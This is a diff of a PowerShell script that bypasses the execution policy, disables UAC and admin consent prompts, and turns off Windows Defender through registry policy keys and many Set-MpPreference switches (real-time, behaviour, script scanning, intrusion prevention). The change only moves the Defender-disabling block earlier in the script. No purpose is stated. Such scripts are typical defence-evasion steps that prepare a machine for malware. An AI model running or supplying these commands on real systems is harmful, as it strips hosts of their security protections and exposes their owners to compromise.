@@ -2,6 +2,11 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass
 #Disable UAC
 New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
 Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+#Disable Defender
+New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWord -Force
+New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiVirus' -Value 1 -PropertyType DWord -Force
+New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'ServiceKeepAlive' -Value 0 -PropertyType DWord -Force
+
 #Disable Engines
 Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
 Set-MpPreference -DisableCatchupFullScan $true -ErrorAction SilentlyContinue
@@ -29,7 +34,3 @@ Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
 Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
 Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
 Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
-#Disable Defender
-New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWord -Force
-New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiVirus' -Value 1 -PropertyType DWord -Force
-New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'ServiceKeepAlive' -Value 0 -PropertyType DWord -Force
